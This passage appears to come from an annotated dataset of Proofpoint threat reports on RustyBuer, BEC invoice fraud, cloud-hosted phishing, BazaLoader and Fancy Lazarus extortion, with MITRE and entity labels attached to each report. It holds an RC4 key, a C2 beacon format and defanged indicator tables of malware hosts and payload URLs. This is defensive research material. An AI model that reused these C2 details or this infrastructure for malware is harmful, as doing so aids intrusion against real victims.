identical to the requests used in the latest version of Buer.\nThe C2 functions are handled via HTTP(S) POST requests.\nThe initial POST request will be sent with POST data delimitated by the \"&\" and \"=\" characters.\nThe POST request contains both pseudorandom characters and encrypted information about the compromised system.\nAn example command beacon can be seen in Figure 6:\n![Rusty_6](/sites/default/files/inline-images/Rusty_6.png)\nFigure 6: RustyBuer initial POST request\n![Rusty_7](/sites/default/files/inline-images/Rusty_7.png)\nFigure 7: Buer Loader initial POST request\nAn example of the plaintext parameter from Figure 8 with the pseudorandom characters removed is:\nYv3FHY+KQgL5YKs58+uRvGVZT8IS82xY+eij8SW/OhZd5Kk70Oryj8G4C5NB341+u9Xk8FFWvgdHoxrX68ZwZdrWO18fPzUeMJZvDfXcWKo0WaSad2RooXIPzbjPTqooMCxES4LVt/a812bqP8iJnuvZb1JIHa4m/eLC6hOGQBMSG8yY561aXdv+iLB3vhv8kww/1vhyIsmvxHzgcAzY9NWDSm/oZ3BfjAnfVCsgwQ6MebuHvEUXjyJBe6NsjRS+bYiLLrjO9HU=JbSYHpjf\u00fa\u00c6\nThese request parameters are encrypted.\nThey can be decrypted by:\n1. Base64 decoding\n2. Hex decoding\n3. RC4 decryption (the key used in the analyzed samples was \u201ckpM5WOtfo\u201d)\nThe decrypted plaintext parameter from Figure 6 is:\n299bc0beffe830d0871f8f6d7cadb40117208ea59f59cadd08b220b903f4e31c|e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855|Windows 7 Ultimate|x64|4|Admin|[Computer Name]|133/238|[AD Domain]|[User Name]|1\nIt contains pipe-delimited data consisting of:\n* Bot ID (SHA-256 hex digest of various system parameters such as hardware profile GUID and name, computer name, volume serial number, and CPUID)\n* An SHA-256 hash of its own executable image\n* Windows version\n* Architecture type\n* Number of processors\n* User privileges\n* Computer name\n* Space used / total (suspected)\n* AD Domain\n* User name\nThe response beacon can be decrypted similarly to the request parameter above, except that the hex-encoded bytes are separated by dash characters.\nAs with Buer, the JSON object returned in the beacon response contains various options on how to download and execute a payload:\n* type - there are two types:\n* options - specifies options for the payload to download:\n+ Hash - only applicable to \u201cupdate\u201d type to determine whether a new update is available\n+ x64 - whether the payload is 64-bit\n+ FileType - not used in analyzed samples\n+ AssemblyType - not used in analyzed samples\n+ AccessToken - used to download the payload\n+ External - indicates whether the payload is downloaded from the C&C or an external URL\n* method - method of execution\n* parameters - parameters to pass on the command line\n* pathToDrop - not used in analyzed samples\n* autorun - indicates whether to setup Registry RunOnce persistence for the payload\n* modules\n* timeout - not used in analyzed samples\n**Conclusion**\nDespite existing since 2019, the new variant of Buer loader malware suggests threat actors continue to modify their payloads in a likely attempt to evade detection.\nWhen paired with the attempts by threat actors leveraging RustyBuer to further legitimize their lures, it is possible the attack chain may be more effective in obtaining access and persistence.\nRustyBuer and the original Buer loader have been observed as a first-stage loader for additional payloads including Cobalt Strike and multiple ransomware strains, as well as possibly providing victim access to other threat actors in the underground marketplace.\nProofpoint anticipates this activity will continue.\nBased on the frequency of RustyBuer campaigns observed by Proofpoint, researchers anticipate we will continue to see the new variant in the future.\n**Indicators of Compromise (IOCs)**\n| **IOC** | **IOC Type** | **Description** |\n| Serevalutinoffice[.]com | Domain | C&C (RustyBuer) |\n| orderverification-api[.]com | Domain | C&C (RustyBuer) |\n| Gerstaonycostumers[.]com | Domain | C&C (RustyBuer) |\n| authcert-ca[.]com | Domain | C&C (RustyBuer) |\n| documentssign-api[.]com | Domain | C&C (RustyBuer) |\n| docusigner-api[.]com | Domain | C&C (RustyBuer) |\n| Miyfandecompany[.]com | URL | C&C (RustyBuer) |\n| https://cembank-api[.]com | URL | C&C (RustyBuer) |\n| http://213.252.244[.]114/ayhtvcgcfcfrgcdxdxdrcrhj | Payload | Cobalt Strike Payload |\n| 213.252.244[.]114 | IP | Cobalt Strike C&C |\n| https://techlog[.]xyz/page.icore | URL | Buer Payload |\n| Russell@simpleweb-online.co[.]uk | Email | Sender |\n| Hernandez@ubstreasury[.]biz | Email | Sender |\n| Foster@simpleweb-online.co[.]uk | Email | Sender |\n| Patterson@ubstreasury[.]biz | Email | Sender |\n| Campbell@rockyourstay[.]net | Email | Sender |\n| Henderson@fossilqwanderer[.]org | Email | Sender |\n| Powell@onlinefundraisingtoday[.]org | Email | Sender |\n| Evans@onlinefundraisingtoday[.]org | Email | Sender |\n| Brooks@fossilqwanderer[.]org | Email | Sender |\n| Edwards@sun988info[.]com | Email | Sender |\n| A061180b16f89099da6d34c5a3976968c19a3977c84ce0711ddfef6f7c355cac | SHA256 | 2021-04-12 Sample|\n| 3abed86f46c8be754239f8c878f035efaae91c33b8eb8818c5bbed98c4d9a3ac  | SHA256 | 2021-04-19 Sample |\n**ET Signatures**\n2848365 - RustyBuer Checkin", "mitre_ids": ["T1486", "S0154", "S0154", "T1566", "T1566", "T1566", "T1566", "T1566", "T1059", "T1204", "T1036", "TA0003", "T1547", "S0154", "S0154", "S0154", "TA0001", "TA0011", "TA0011", "TA0011", "TA0011", "T1071", "T1573", "T1573", "T1105", "T1105", "T1105", "T1547", "S0154", "T1486", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "TA0011", "S0154", "S0154", "TA0011"], "anno_name_label": [["MALWARE", "Buer"], ["TECHNIQUE", "Buer"], ["TECHNIQUE", "Buer"], ["TECHNIQUE", "Buer"], ["MALWARE", "RustyBuer"], ["TECHNIQUE", "Buer"], ["MALWARE", "RustyBuer"], ["TECHNIQUE", "Buer"], ["MALWARE", "RustyBuer"], ["TECHNIQUE", "Buer"], ["TECHNIQUE", "Buer"], ["TECHNIQUE", "Buer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["TECHNIQUE", "Buer"], ["TECHNIQUE", "Buer"], ["MALWARE", "RustyBuer"], ["TECHNIQUE", "Buer"], ["TECHNIQUE", "Buer"], ["TECHNIQUE", "Buer"], ["TECHNIQUE", "Buer"], ["MALWARE", "RustyBuer"], ["TECHNIQUE", "Buer"], ["TECHNIQUE", "Buer"], ["TECHNIQUE", "Buer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["TECHNIQUE", "Buer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["MALWARE", "RustyBuer"], ["TECHNIQUE", "Buer"], ["MALWARE", "RustyBuer"]], "cti_entity_class": ["CE", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE"]}, {"cti_report": "BEC Taxonomy: Invoice Fraud\nMay 06, 2021\n### Last Time in the BEC Taxonomy Series\u2026\nProofpoint researchers\u00a0in the\u00a0[first](/us/blog/threat-insight/bec-taxonomy-proofpoint-framework \"BEC Taxonomy: A Proofpoint Framework\")\u00a0of\u00a0the\u00a0[Business Email Compromise](/us/threat-reference/business-email-compromise \"Business Email Compromise (BEC)\")\u00a0(BEC) taxonomy series introduced our framework for how to approach this\u00a0increasingly\u00a0costly threat.\nIn the blog we detailed three tiers\u00a0(Figure 1)\u2014Identity, Deception, and Theme\u2014for classifying email fraud\u00a0in an effort\u00a0to\u00a0make it manageable for companies and researchers to label and understand the email threats\u00a0facing them.\nIn\u00a0this post,\u00a0we will dive\u00a0further\u00a0into the Theme tier, specifically focusing on invoicing fraud and show how the Email Fraud Taxonomy works in action.\n![BEC taxonomy](/sites/default/files/inline-images/MicrosoftTeams-image%20%2810%29_5.png)\n*Figure 1. Email Fraud Taxonomy Framework*\n### What is Invoice Fraud.\nInvoicing fraud\u00a0at its core\u00a0is an attempt to deceive a company or individual into paying for products or services they did not\u00a0purchase or\u00a0redirect payment of a legitimate invoice to an account the\u00a0threat actor\u00a0controls.\nCommon words in the subject lines of fraudulent invoice emails are payment-oriented and\u00a0the invoices used may appear professional with company seals and the like.\nThe email messages may list out specific amounts and have urgent language such as, \"this invoice is 90 days past due and must be paid immediately.\nThe threat actor may also use intimidation\u00a0through the use of\u00a0legal jargon when laying out repercussions of an untimely response.\nWhile a fraudulent invoice can\u00a0appear to\u00a0be sent from anyone\u2014a fellow employee or an unknown individual, the most successful appear to\u00a0leverage\u00a0supplier\u00a0relationships, which include any person or business that provides services or products to another.\nAttacks leveraging supplier relationships can end up costing\u00a0companies\u00a0anywhere from tens of thousands of dollars to multiple millions, making it a\u00a0worthwhile\u00a0example\u00a0to illustrate the Email Fraud Taxonomy Framework.\n### Supplier Invoice Fraud and the Email Fraud Taxonomy Framework\nSupplier invoice fraud schemes can occur via two\u00a0Deception means\u00a0(per the\u00a0Proofpoint\u00a0Email Fraud Taxonomy Framework\u00a0in Figure 1 above): impersonation and compromise.\nSupplier\u00a0impersonation\u00a0occurs when a\u00a0threat\u00a0actor utilizes common spoofing techniques to\u202fmasquerade\u202fas a legitimate supplier.\nOften\u202fthese\u00a0fraudulent emails\u00a0are sent from free webmail domains, or\u00a0unrelated\u00a0compromised accounts the\u00a0threat\u00a0actor controls.\nThese\u00a0types of attacks\u00a0may even look like the threat actor compromised an account, but really,\u00a0they just used impersonation reconnaissance to get their hands on an invoice, as demonstrated in Figure 2.\n![](data:image;base64_removed,)\u00a0\n*Figure 2. Anatomy of a supplier invoice fraud attack via multiple layers of impersonation*\nSupplier compromise, on the other hand,\u00a0occurs when a\u00a0malicious\u00a0actor\u202fhas gained unauthorized access to an\u202femail account at a\u00a0supplier\u00a0likely through a prior successful phishing campaign or purchased stolen credentials.\nIn some of the more elaborate supplier compromise scenarios, the threat actor may\u00a0even\u00a0hijack an existing email thread of a compromised account.\nThe threat actor then uses this access to observe, mimic, and utilize historical conversations to\u00a0craft believable messages with supporting documents.\nSince the threat actor\u2019s messages end up as part of an email thread that is already in progress, the victim is much more likely to believe in their legitimacy,\u00a0and the threat actor has a greater chance of\u00a0success.\nIn fact, attacks such as these can be some of the most convincing a user will\u00a0ever face.\nOften, a threat actor will use both impersonation and compromise\u00a0in a successful invoice\u00a0campaign.\nThese attacks can be targeted but are more often opportunistically operationalized based on the information attackers learn from compromising supply chains.\nWhen this occurs, the\u00a0Taxonomy Framework\u00a0enables dual categorization to show the nuances of more complicated attacks, as\u00a0illustrated\u00a0in Figure\u00a03.\n![BEC taxonomy](/sites/default/files/inline-images/MicrosoftTeams-image%20%2811%29.png)\n*Figure\u00a03. Supplier\u00a0invoice\u00a0fraud example\u00a0with both impersonation and compromise deception tactics*\n### Real World Example\nIn one of Proofpoint\u2019s\u00a0more recently observed\u00a0supplier invoice fraud attacks, a\u00a0threat actor\u00a0attempted to steal\u00a0over $100,000\u00a0in payment.\nThe attacker began by\u00a0impersonating a wine\u00a0seller\u00a0to convince the buying company to change the banking information for payment.\nIn\u00a0one of the\u00a0initial\u00a0emails, the threat actor\u00a0utilized an\u00a0already established email thread\u2014also\u00a0known as\u00a0thread hijacking,\u00a0which can provide valuable insights and aid in bolstering the victim\u2019s confidence that the email is genuine.\nIn the email, the attacker\u00a0attempted to convince the paying company that the banking information for payment needed to be changed, and that all communication should be done via email\u00a0(Figure\u00a04).\n![Graphical user interface, text, application\nDescription automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a04*\nAfter failing to get the response they were looking for, the threat actor\u00a0continued\u00a0to\u00a0amplify\u00a0their language, urging action (Figure\u00a05).\nThe threat actor\u00a0included a detailed invoice document\u00a0with the\u00a0supplier\u2019s\u00a0seal and stamp\u00a0to lend credibility to the scheme\u00a0as well\u00a0(Figure\u00a06).\n![Graphical user interface, text Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a05*\n![A picture containing table Description automatically generated](data:image;base64_removed,)\u00a0\n*Figure\u00a06.\nInvoice PDF.\n*Some of the demonstrated internal knowledge by the attacker in this situation led Proofpoint analysts to suspect that there was a compromise outside of Proofpoint\u2019s visibility.\nThe attacker, we assess,\u00a0leveraged this compromise and then used impersonation techniques,\u00a0specifically\u00a0display name spoofing and reply-to manipulation, as shown in\u00a0the\u00a0mapping of this\u00a0particular attack\u00a0in\u00a0Figure\u00a07.\n![BEC taxonomy](/sites/default/files/inline-images/MicrosoftTeams-image%20%2812%29.png)\n*Figure\u00a07. Real world example of supplier invoice fraud*\n### Keep Reading\u2026\nIn our next BEC blog post,\u00a0we will tackle\u00a0another category in the Theme tier,\u00a0[payroll redirects](/us/blog/threat-insight/bec-taxonomy-payroll-redirects \"BEC Taxonomy: Payroll Redirects \"),\u00a0just in time for the US tax filing deadline\u00a0on 17 May 2021.", "mitre_ids": ["T1566", "T1566", "T1566", "T1566", "T1566"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Security Brief: Threat Actors Exploit Microsoft and Google Platforms to Host and Send Millions of Malicious Messages\nMay 18, 2021\n<!--/*--><![CDATA[/* ><!--*/\n<!--/*--><![CDATA[/* ><!--*/\n<!--/*--><![CDATA[/* ><!--*/\n.node-blog-full .blog-content img {\nborder: 1px solid #000 !important;\n}\n/*--><!]]]]]]><![CDATA[><![CDATA[>*/\n/*--><!]]]]><![CDATA[>*/\n/*--><!]]>*/\nOrganizations worldwide have adopted cloud collaboration tools in record numbers\u2014and attackers have quickly followed.\nIn recent months we have observed an acceleration in threat actors abusing Microsoft and Google\u2019s popular infrastructure to host and send threats across Office 365, Azure, OneDrive, SharePoint, G-Suite, and Firebase storage.\nLast year, 59,809,708 malicious messages from Microsoft Office 365 targeted thousands of our customers.\nAnd more than 90 million malicious messages were sent or hosted by Google, with 27% sent through Gmail, the world\u2019s most popular email platform.\nIn Q1 2021, we observed seven million malicious messages from Microsoft Office 365 and 45 million malicious messages from Google infrastructure, which far exceed per quarter Google-based attacks in 2020.\nThe malicious message volume from these trusted cloud services exceeded that of any [botnet](https://www.proofpoint.com/us/threat-reference/ddos) in 2020, and the trusted reputation of these domains, including outlook.com and sharepoint.com, increases the difficulty of detection for defenders.\nThis authenticity perception is essential, as email recently regained its status as the top vector for [ransomware](https://www.coveware.com/blog/ransomware-marketplace-report-q4-2020) and threat actors increasingly leverage the supply chain and partner ecosystem to compromise accounts, steal credentials, and siphon funds.\nWe recently released [supply chain findings](https://www.proofpoint.com/us/blog/email-and-cloud-threats/98-organizations-received-email-threats-suppliers-what-you-should-know) that 98% of nearly 3,000 monitored organizations across the U.S., UK, and Australia, received a threat from a supplier domain over a 7-day window in February 2021.\nGiven the level of access that can be granted from a single account, over the last year threat actors targeted 95% of organizations with [cloud account compromise](https://www.proofpoint.com/us/blog/cloud-security/oauth-abuse-think-solarwindssolorigate-campaign-focus-cloud-applications) attempts, and more than half have experienced at least one compromise.\nOf those compromised, over 30% experienced post-access activity including file manipulation, email forwarding, and OAuth activity.\nIf stolen, threat actors can leverage credentials to log into systems as [imposters](https://www.proofpoint.com/us/blog/threat-protection/combatting-bec-and-eac-how-block-impostor-threats-inbox), move laterally across multiple cloud services and hybrid environments, and send convincing emails cloaked as a real employee, orchestrating potential financial and data loss.\n**Microsoft and Google Phishing Examples**\nBelow is a round-up of recent [phishing](https://www.proofpoint.com/us/threat-reference/phishing) campaigns that demonstrate how threat actors use both Microsoft and Google when trying to convince users to act.\nFor example, the following credential phishing attempt features a Microsoft SharePoint URL claiming to host a corporate policy and COVID-19 guidelines document.\nThe document contains a link leading to a fake Microsoft authentication page designed to harvest user credentials.\nThis low volume campaign involved approximately 5,000 messages targeting users in transportation, manufacturing, and business services.\n![May 18_Image 1](/sites/default/files/inline-images/May%2018_Image%201_0.png)\nAn additional example of a recent fake video conferencing credential phishing campaign featured the \u201c.onmicrosoft.com\u201d domain name.\nThe messages contain a URL which leads to a fake webmail authentication page designed to harvest user credentials.\nThis low volume campaign involved approximately 10,000 messages focused on manufacturing, technology, and financial services users.\n![May 18_Image 2](/sites/default/files/inline-images/May%2018_Image%202.png)\nA March 2021 Gmail-hosted campaign featured a fake employee benefits message and Microsoft Excel attachment targeting manufacturing, technology, and media/entertainment organizations.\nIf macros are enabled, it will install and run The Trick, a trojan that intercepts and logs banking website visits to steal credentials.\n![May 18_Image 3](/sites/default/files/inline-images/May%2018_Image%203.png)\nIn February 2021, we also observed a very low volume Xorist ransomware campaign from a Gmail-hosted email address.\nIt attempts to trick accounting recipients into access password-protected zipped MS Word documents.\nThese documents contain macros which, if enabled, drop the ransomware.\n![May 18_Image 4](/sites/default/files/inline-images/May%2018_Image%204.png)\nOur research clearly demonstrates that attackers are using both Microsoft and Google infrastructure to disseminate malicious messages and target people as they leverage popular cloud collaboration tools.\nWhen coupled with heightened ransomware, supply chain, and cloud account compromise, advanced people-centric email protection must remain a top priority for security leaders.\nAs a leading cybersecurity vendor with our DNA in email security, we have a nearly 100% efficacy rate on stopping [advanced threats arriving through email](https://www.proofpoint.com/us/solutions/advanced-email-security) and invest over 20% of our annual revenue on innovation, including advanced threat detection and expert threat systems to stop people-centric data breaches.\nWe protect over 50% of the Fortune 1000, billions of email messages, billions of URLs and attachments, tens of millions of cloud accounts and more\u2014trillions of data points across all the digital channels that matter.\nPlease visit <https://www.proofpoint.com/us/why-proofpoint/nexus-threat-graph> for additional information on Proofpoint\u2019s Nexus Threat Graph.", "mitre_ids": ["T1486", "T1566", "T1566", "T1566", "T1056", "T1566", "T1056", "T1566", "T1059", "T1105", "T1059", "T1557", "T1486", "T1059", "T1486", "T1486", "T1195"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "BazaFlix: BazaLoader Fakes Movie Streaming Service\nMay 26, 2021\n### Key Findings\n1. BazaLoader affiliates continue to use elaborate infection chains requiring significant victim interaction to distribute BazaLoader malware.\n2. Emails directed the victim to call a customer service line which sent them to a website containing malicious content.\n3. The threat actor created a robust fake movie streaming service called BravoMovies, complete with fake movie titles as a landing page.\n### Overview\nProofpoint researchers identified a BazaLoader campaign requiring significant human interaction to execute and install the BazaLoader backdoor.\nThe threat actor leveraged phone-based customer service representatives to direct victims to unknowingly download and install the [malware](https://www.proofpoint.com/us/threat-reference/malware).\nThis campaign is representative of a broader trend leveraged by the BazaLoader threat actors using call centers as part of an intricate attack chain.\nThe entertainment-themed campaign was first observed in early May 2021 and masqueraded as a streaming entertainment service, complete with a slick website featuring fake movies.\nThe campaign demonstrates an inversely proportional relationship between successful infection rates and asking people to complete complicated steps \u2013 the more steps required by the user, the less likely they are to complete the attack chain.\nHowever, despite being counterintuitive, the techniques used by the threat actors in this, and similar, campaigns help bypass fully automated threat detection systems.\nAdditionally, leveraging a streaming service cancellation lure preys on a growing trend of users [cancelling](https://www2.deloitte.com/us/en/insights/industry/technology/video-streaming-services-churn-rate.html) online entertainment following major growth in the industry during 2020.\n**Campaign Details**\nBazaLoader is a downloader written in C++ that is used to download and execute additional modules.\nProofpoint first observed BazaLoader in April 2020.\nIt is currently used by multiple threat actors and frequently serves as a loader for disruptive malware including [Ryuk](https://www.proofpoint.com/us/resources/webinars/what-healthcare-industry-should-know-about-ryuk-ransomware) and Conti [ransomware](https://www.proofpoint.com/us/threat-reference/ransomware).\nProofpoint assesses with high confidence there is a strong overlap between the distribution and post-exploitation activity of BazaLoader and threat actors behind The Trick malware, also known as Trickbot.\n**Infection Chain**\n![infection chain](/sites/default/files/inline-images/infection%20chain.png)\nIn the recent BazaLoader campaign, messages purport to be from various senders with subjects such as:\n* Your trial period M0012064753012345 is going to be expired soon.\nThankfully you made a decision to stick with us.\n* Demo stage is expired.\nYour account #M0272028060812345 will be automatically transferred to premium plan.\n![Bazaloader](/sites/default/files/inline-images/F1.png)\n*Figure 1: Initial BazaLoader email masquerading as an entertainment streaming service*\nThe emails contain phone numbers and references to the \"BravoMovies\" company.\nThe messages purport to inform the target their credit card will be charged unless they cancel their subscription to the service.\nIf the user calls the phone number provided in the email, a customer service representative will verbally guide the user to the company's alleged website.\nThe website is a convincing representation of a movie and television streaming service.\nThe threat actors used fake movie posters obtained from various open-source resources including an advertising agency, the creative social network Behance, and the book \u201cHow to Steal a Dog.\n![bravo movies](/sites/default/files/inline-images/F2.png)\n*Figure 2: BravoMovies landing page*\nWhen the user visits the site mentioned, navigates to the Frequently Asked Questions component of the website, and follows the directions to unsubscribe via the \u201cSubscribtion\u201d page, they will be directed to the download of an Excel Sheet.\n![FAQ](/sites/default/files/inline-images/F3.png)\n*Figure 3: FAQ page with cancellation instructions*\n![subscriptions ](/sites/default/files/inline-images/F4.png)\n*Figure 4: Fake subscription cancellation page*\nThe Excel sheet contains macros that, if enabled, will download BazaLoader.\n![excel ](/sites/default/files/inline-images/F5.png)\n*Figure 5: Malicious Excel Sheet*\nAt this time, Proofpoint has not observed the second-stage payload in this campaign.\n**Related Campaigns**\nProofpoint has observed BazarLoader threat actors using the method of phone-based customer service representatives to direct malicious downloads since February 2021.\nSecurity researchers have dubbed this method [\u201cBazarCall\u201d](https://unit42.paloaltonetworks.com/bazarloader-malware/).\nProofpoint has [previously observed](https://www.proofpoint.com/us/blog/threat-insight/baza-valentines-day) BazaLoader email threat campaigns requiring significant human interaction in order to execute the malware.\nThe previous campaigns included subscription pharmaceutical services and [lingerie and flower](https://www.proofpoint.com/us/blog/threat-insight/baza-valentines-day) orders.\nAdditionally, Proofpoint researchers have observed similar infection chains leading to the distribution of The Trick instead of BazaLoader.\nBy leveraging attack chains that require a lot of human interaction, threat actors can bypass some automated threat detection services that only flag on malicious links or attachments in email.\nProofpoint anticipates the threat actors behind BazaLoader and The Trick will continue to use these techniques in future campaigns.\n**Conclusion**\nUsing entertainment subscription themes may be a timely and effective method for convincing users to engage with the email content and follow-on malicious documents.\nDuring the COVID-19 pandemic in 2020, subscriptions to online streaming services [skyrocketed](https://www.motionpictures.org/press/global-subscriptions-to-online-video-services-exceeds-one-billion-for-first-time-ever-new-mpa-report-finds/), surpassing one billion users globally last year.\nBut [according to recent](https://fortune.com/2021/04/19/netflix-earnings-subscriber-numbers-profit-first-quarter-q1-nflx/) 2021 data, consumers are using fewer services while churning through free subscriptions and cancelling when their trials run out.\nBazaLoader threat actors are taking advantage of this human behavior trend in the identified campaign.\n**Indicators of Compromise**\n| **IOC** | **IOC Type** | **Description** | **First Observed** |\n| urbancinema[.]net | Domain | Landing Page | 2021-05-05 |\n| bravomovies[.]net | Domain | Landing Page | 2021-05-01 |\n| bvcinema[.]net | Domain | Landing Page | 2021-05-06 |\n| 47.91.77[.]83 | IP | BravoMovies Website Host | 2021-05-05 |\n| 8.209.65[.]249 | IP | BravoMovies Website Host | 2021-05-01 |\n| 8.209.92[.]183 | IP | BravoMovies Website Host | 2021-05-04 |\n| 8.209.75[.]180 | IP | BravoMovies Website Host | 2021-05-04 |\n| 8.211.4[.]26 | IP | BravoMovies Website Host | 2021-05-06 |\n| 8.211.6[.]4 | IP | BravoMovies Website Host | 2021-05-06 |\n| 8.209.67[.]183 | IP | BravoMovies Website Host | 2021-05-10 |\n| 47.91.74[.]88 | IP | BravoMovies Website Host | 2021-05-15 |\n| 176.111.174[.]60 | IP | BazaLoader Excel Payload Host | 2021-05-04 |\n| hxxps://18.237.242[.]195/g1\\_262/bt\\_64\\_g1\\_262 | URL | BazaLoader C2 | 2021-05-04 |\n| hxxp://noise1[.]xyz/campo/n/o | URL | BazaLoader Excel Payload | 2021-05-04 |\n| 9663dc275239aa93ceccedae7a0d54e10def18dd177d231264a323a4175a23d4 | SHA256 | BazaLoader Hash | 2020-04-25 |\n### ET Signatures:\n2033033 - ET TROJAN BazaLoader CnC Activity \u00a0\n2033034 - ET TROJAN Observed Malicious SSL Cert", "mitre_ids": ["S0534", "S0534", "S0534", "T1566", "S0534", "S0534", "T1566", "S0534", "S0534", "T1105", "S0534", "S0446", "T1486", "T1486", "S0534", "S0266", "S0266", "S0534", "S0534", "T1566", "T1566", "T1105", "T1059", "T1059", "S0534", "S0534", "S0266", "S0534", "T1566", "S0534", "S0266", "S0534", "S0534", "S0534", "TA0011", "S0534", "S0534", "S0534"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Ransom DDoS Extortion Actor \u201cFancy Lazarus\u201d Returns\nJune 10, 2021\n### Key Takeaways\n* The ransom distributed denial of service extortion threat actor known as \"Fancy Lazarus\" is back, taking aim at an increasing number of industries, including the energy, financial, insurance, manufacturing, public utilities, and retail sectors.\n* There is no known connection between this group and the APT actors with the same names.\n* These latest campaigns have some differences to previous campaigns, including a change to the group's name, the amount of Bitcoin being ransomed, and variations in the email body content.\n* While it is not possible for organizations or companies to avoid being the target of such attacks, there are indications that most such threats either do not materialize into an actual attack or they are successfully mitigated.\n### Overview\nAs of May 12, 2021,\u00a0Proofpoint\u00a0researchers are\u00a0tracking\u00a0renewed\u00a0distributed denial of service (DDoS)\u00a0extortion\u00a0activity\u00a0targeting\u00a0an increasing number of industries, including the energy, financial, insurance, manufacturing, public utilities, and retail\u00a0by the threat actor \u201cFancy Lazarus.\nProofpoint researchers have observed the activity primarily at U.S. companies or those with a global footprint.\nThe actor\u00a0took over a month-long break from April to May 2021 before returning with new campaigns that include some changes to the group\u2019s tactics, techniques, and procedures:\u00a0\n* New name:\u00a0The group, who have previously identified themselves as \u201cFancy Bear\u201d, \u201cLazarus,\u201d \u201cLazarus Group,\u201d and \u201cArmada Collective,\u201d among others,\u00a0is now going by \u201cFancy Lazarus.\nThere is no known connection between this group and the APT actors with the same names.\n* New price:\u00a0The extortion emails now\u00a0have adjusted ransom pricing, lowering it from ransoms as high as ten\u00a0Bitcoin (BTC)\u00a0to its current two BTC starting price.\nThis change is likely to account for Bitcoin\u2019s fluctuating value.\n* Variation in email content:\u00a0In terms of email body content, the specific variant is reminiscent\u00a0of\u00a0the original variants from August 2020 with some minor changes and evolutions.\nIt is interesting that the group is still going back and tweaking\u00a0the\u00a0original email, potentially indicating its effectiveness.\nBetween August 2020 and now,\u00a0however,\u00a0they\u00a0have\u00a0tried completely different text in the emails.\n### Background\nIn mid-to-late August 2020,\u00a0[Akamai](https://blogs.akamai.com/sitr/2020/08/ransom-demands-return-new-ddos-extortion-threats-from-old-actors-targeting-finance-and-retail.html)\u00a0and the U.S. Federal Bureau of Investigation\u00a0(FBI)\u00a0[alerted](https://www.documentcloud.org/documents/7070798-FLASH-MU-000132-DD.html)\u00a0organizations\u00a0to a spate of ransom denial-of-service extortion emails from this group.\nAccording to the\u00a0published\u00a0reports,\u00a0this group\u00a0took\u00a0aim at\u00a0thousands of organizations from multiple global industry verticals.\nIn each case the threat actor\u00a0demanded\u00a0Bitcoin payment or else a small-scale denial-of-service attack\u00a0would\u00a0be launched with a more substantial\u00a0attack mere days later.\n### Campaign Details\nThe campaigns always begin with sensational emails.\nThe current iteration,\u00a0as illustrated in Figure 1,\u00a0starts\u00a0with\u00a0an announcement of the name the group\u00a0uses\u00a0currently and an acknowledgement that they are targeting a specific company.\nThey then threaten a DDoS attack in seven days, and,\u00a0to prove it is not a hoax, mention a \"small attack\" that will be launched on a specific IP, subnet, or Autonomous System.\nThe emails claim that the max attack speed will be \"2\u00a0Tbps.\nThey also warn about potential damage to the target company\u2019s reputation and loss of internet access at their offices\u00a0almost certainly\u00a0to\u00a0further\u00a0coerce the victim into complying with\u00a0their demands.\n![](data:image;base64_removed,)\u00a0Figure 1.\nExample of current emails being sent\u00a0by \u201cFancy Lazarus.\nEach of the\u00a0campaigns is\u00a0also\u00a0characterized by\u00a0the following elements:\u00a0\n* **Recipients:**\nThe emails are typically sent to well researched recipients, such as individuals listed as contacts in Border Gateway Protocol (BGP) or\u00a0Whois\u00a0information for company networks.\nThe emailed individuals also work in areas such as communications, external relations, investor relations.\nAdditionally, extortion emails are often sent to email aliases such as\u00a0help desk, abuse, administrative contacts, or customer service.\n* **Email body:**\u00a0\nThere are three email variants sent to the same recipients conveying the same information, except with the email body in plain text, HTML, or as a JPG image attachment.\nThis is a likely\u00a0an\u00a0attempt to evade detections.\n* **Sender emails:**\u00a0\nEach sender email is different and unique to the targeted company.\nPreviously the sender often contained \u201cFancy Bear,\u201d\u00a0\"F.B.,\u201d\u00a0\"Armada Collective,\u201d\u00a0\"A.C.,\u201d\u00a0\"Lazarus,\u201d\u00a0or \"Lazarus Group,\" and even\u00a0at times\u00a0included the targeted company\u2019s\u00a0highest-ranking\u00a0person such as\u00a0the\u00a0CEO\u2019s\u00a0name.\nIn the most\u00a0current campaign,\u00a0a random \u201cFirst name\u00a0Last name\u201d format is\u00a0used\u00a0and the names appear fictional.\n* **Sender email provider:**\u00a0\nEach email is created at one of the various free email services.\n* **Payment:**\nProofpoint\u00a0has\u00a0observed ransom demands 